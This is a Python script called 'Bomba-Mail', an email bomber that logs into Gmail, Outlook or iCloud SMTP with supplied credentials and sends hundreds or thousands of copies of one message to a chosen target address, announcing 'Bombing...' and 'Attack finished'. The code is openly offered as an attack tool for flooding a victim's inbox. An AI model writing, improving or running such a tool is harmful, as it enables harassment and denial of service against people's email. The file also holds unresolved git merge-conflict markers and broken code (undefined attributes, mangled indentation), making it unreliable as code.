import smtplib
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def banner():
    print(bcolors.OKGREEN + '+[+[+[ Bomba-Mail ]+]+]+')
    print(bcolors.OKGREEN + '+[+[+[ made with Python')
    print(bcolors.OKGREEN + r'''
          
                  _____              ____                  _               
 |  __ \            |  _ \                | |              
 | |  | | ___ _ __  | |_) | ___  _ __ ___ | |__   ___ _ __ 
 | |  | |/ _ \ '__| |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |__| |  __/ |    | |_) | (_) | | | | | | |_) |  __/ |   
 |_____/ \___|_|    |____/ \___/|_| |_| |_|_.__/ \___|_|   
                                                            
                            . . .                         
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠤⠖⠛⣷⣶⣶⠿⢿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⣾⣿⠋⠀⠀⠀⢾⣿⠏⠀⠀⠀⠀⠈⠛⠻⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠙⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢻⣷⣶⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣤⣤⣠⣶⣿⡅⠀⠀⠀⣤⣤⣴⣶⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠆⠀⠹⣷⣤⡀⠀⠀⠀⠀⠀
⠀⠀⣰⡿⠋⠉⢹⣿⠁⠉⠀⠀⠀⠀⠀⣿⠏⠀⠀⠀⠀⢀⣠⣤⠀⠀⠀⠀⠲⣤⣄⣀⣀⠀⠀⠀⠙⢻⣷⣦⡀⠀⠀⠀
⠀⣰⣿⠇⠀⠀⠸⠿⠂⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠠⣿⡏⠁⠀⠀⠀⠀⠀⠈⢿⠁⠀⠀⠀⠀⠀⠸⣿⠉⢿⣆⠀⠀
⢰⣿⡁⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣦⡀⠛⢿⣦⠀⠀⡀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠛⢀⠀⣿⡄⠀
⢸⡿⠁⠀⠀⢿⣄⠀⡀⠀⠀⠀⠀⢀⣤⣀⣀⣀⣤⣿⣷⣶⡿⠻⣿⣿⠿⣷⣦⣄⣸⣷⠀⠀⠀⢠⣄⠀⠀⠈⠛⠿⣿⠀
⠸⣿⣾⠃⠀⠀⠛⠿⠃⠀⠀⠰⣤⣴⣿⠿⠿⠿⠿⠛⠉⠉⠀⠀⡄⠀⢰⣿⠟⢿⣿⣿⣄⡀⢰⣿⡟⠀⠀⠀⠀⠀⢹⡇
⠀⢸⣿⢸⡆⠀⠶⠿⠀⣀⡀⠠⣬⣭⣭⣀⠀⣆⠀⠀⢠⠀⠀⣰⠃⣰⣿⣿⠏⠀⠀⣉⣿⣿⠀⠙⠷⠀⠀⢠⣶⡀⣸⣧
⠀⠸⣿⣿⣷⡄⠀⠀⠘⠋⠁⠀⠀⠀⠉⡛⢷⣽⣦⠀⢸⡄⠀⣿⢀⣿⣿⣿⡶⠒⠛⢋⡅⠀⠀⠀⢀⣴⢀⡼⠟⠛⠟⠁
⠀⠀⠈⠙⠻⣷⣶⣦⣴⡾⠛⠶⠦⣶⠾⢿⣶⣬⣿⡆⠸⣧⢠⡇⢸⣿⣿⣭⣥⣄⣀⣈⣤⣶⣦⣴⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣽⣿⠀⢿⠈⣧⣼⢹⣿⣀⣀⠉⠛⠛⠉⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⢿⡛⢹⣿⡄⠸⠇⣿⡇⠘⣿⡉⢉⣛⠳⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⡿⢛⣉⣣⣾⣿⠛⣿⣷⠀⡀⢸⣇⢸⡟⠛⣿⡇⢠⡟⢿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣅⠀⠀⡉⠛⢿⣅⣀⣿⣿⠀⣿⣄⣉⣹⣧⡴⢾⣯⡀⠈⠋⠉⢻⣿⡀⠀⠀⠀⠀⠀⠀⠀   Author: CarlosHenri05
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣏⣀⣾⣏⠀⠀⠈⠙⠿⠿⠋⢻⡟⠋⠛⢿⡀⠀⠸⠀⠀⣀⠀⠀⣽⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠿⢿⣷⣀⣀⣼⣦⠀⠀⠀⢁⣀⣠⣶⡀⠀⣀⣀⣀⣼⣤⣾⣿⡿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⠿⣿⣷⣶⣿⠿⠟⣿⠛⠿⣶⣿⣿⠿⠋⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⣰⠃⣿⡇⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢻⣇⠀⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠘⣿⠀⣿⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢿⣿⠀⣿⠀⣿⡆⠸⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣯⣾⡟⠀⠁⠀⢿⣇⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣻⣷⠿⠋⠀⡀⠀⠀⠸⢿⡄⠀⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠖⠛⠁⠀⠀⣰⠇⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                      ''')
    
    
    
class Bomber:

    def __init__(self):
        try:
            print(bcolors.WARNING + '+[+[+[ Program initializing]+]+]+  ')
            self.target = str(input(bcolors.WARNING + "Enter target email:"))
            self.options = int(input(bcolors.WARNING + '+[+[+[ Choose options: 1 - 1000msgs | 2 - 500msgs | 3 - 250msgs | 4 - custom'))
            if int(self.options) > int(4) or int(self.options) < int(1):
                print("Invalid option, choose again.")
                sys.exit(1)
            if self.options==4:
                self.custom = int(input("Choose how many total messages you want: "))
        except Exception as e:
            print(f"Error in function init! {e}")
    
    def bomb(self):
       try:
           print(bcolors.WARNING + 'Setting up bomb: ')
           self.amount = None
           if self.options == int(1):
               self.amount = int(1000)
           elif self.options == int(2):
               self.amount = int(500)
           elif self.options == int(3):
               self.amount = int(250)
           else:
               self.amount = int(self.custom)
       except Exception as e:
           print(f'Error in function bomb! {e}')    
            
            
    def email(self):
        try:
            self.server = str(input(bcolors.WARNING + "Choose email server/format: 1 - Gmail | 2 - Hotmail | 3 - iCloud "))
            premade_list = ['1','2','3']
            default_port = True
            if self.server not in premade_list:
                default_port = False
                self.port = int(input("Enter port number: "))
<<<<<<< HEAD
            if default_port == True:
                self.port = int(587)
=======
            else: 
                if self.server in premade_list:
                    case = {
                        1: ['smtp.gmail.com', 587 ],
                        2: ['smtp.live.com', 587], 
                        3: ['smtp.mail.me.com', 587] 
                    }
                    self.smtp_server, self.port = case[self.server]
            print(f"Server: {self.smtp_server} / Port: {self.port}")
        except Exception as e:
            print(f"Error! {e}")
>>>>>>> d58fb5ccd95dab610c5d8e3677346214e3f89e33
            
            if self.server == '1':
                self.smtp_server = 'smtp.gmail.com'
            if self.server == '2':
                self.smtp_server = 'smtp-mail.outlook.com'
            if self.server == '3':
                self.smtp_server = 'smtp.mail.me.com'
            
            print(f"Server: {self.smtp_server} / Port: {self.port}")
            self.sender = str(input(bcolors.WARNING + "Enter sender email:"))
            self.password = str(input(bcolors.WARNING + "Enter sender password:"))
            self.subject = str(input(bcolors.WARNING + "Enter subject: "))
            self.message = str(input(bcolors.WARNING + "Enter message: "))
            
            self.connect = smtplib.SMTP(self.smtp_server, self.port)
            self.connect.ehlo()
            self.connect.starttls()
            self.connect.login(self.sender, self.password)
            
<<<<<<< HEAD
            print(f"From: {self.sender}\nTo: {self.target}\n Subject: {self.subject}\n {self.message}")
=======
            self.msg = f"From: {self.sender}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}"
            
           for i in range(self.amount):
            self.s.sendmail(self.sender, self.target, self.msg)
            print(bcolors.OKGREEN + f"Message sent {i + 1} times")
            
            self.s.quit()
            print(bcolors.OKGREEN + r"Attack finished.")
>>>>>>> d58fb5ccd95dab610c5d8e3677346214e3f89e33
        except Exception as e:
            print(f"Error in function email! {e}")
            
    def send(self):
        try:
            self.connect.sendmail(self.sender, self.target,self.message)
            self.count+=1
            print(f"Message sent! {self.count}")
        except Exception as e:
            print(f"Error in function send! {e}")
    
    def attack(self):
        print(bcolors.WARNING + 'Bombing...')
        for email in range(self.amount):
            self.send()
        self.connect.close()
        print(bcolors.OKGREEN + 'Attack finished!')
        sys.exit(0)
           

if __name__ == '__main__':
    banner()
    bomb = Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
    
            
                    
            
            
        
